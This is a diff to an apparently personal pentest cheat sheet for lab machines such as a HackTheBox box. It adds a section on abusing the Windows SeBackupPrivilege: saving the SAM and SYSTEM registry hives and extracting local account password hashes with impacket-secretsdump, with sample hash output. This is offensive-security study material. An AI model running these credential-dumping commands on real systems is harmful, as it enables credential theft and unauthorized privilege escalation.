@@ -33,6 +33,7 @@
 - <<forwarding, Port-Forwarding and Sliver C2>>
 - <<ssh, SSH>>
 - <<privesc, Privilage Escalation>>
+  * <<backup, SeBackupPrivilege>>
 
 [[overview]]
 == Overview
@@ -870,6 +871,40 @@ scp -P 22 ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/PATH/TO/FILE/"
 Privilage Escalation is the same as in standarlone machines more info in this https://github.com/Neiton-cmd/PentestCheatList/blob/main/PrivEscalation/Windows.md[repo]
 
 Certificates https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547[here]
+
+[[backup]]
+=== SeBackupPrivilege
+
+```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+
+So we do a copy of folowing files into `/Temp` directory
+
+`SAM` contains local users and their hashes
+
+`SYSTEM` contains the main it's `BootKey` if we don't have system sam is empty thing
+
+To dump hashes of local users can be used tool `impacket-secretsdump`
+
+```bash
+impacket-secretsdump -sam sam -system system local   
+```
+
+Must return something like this
+
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up... 
+```
+
+
+
 
 
 
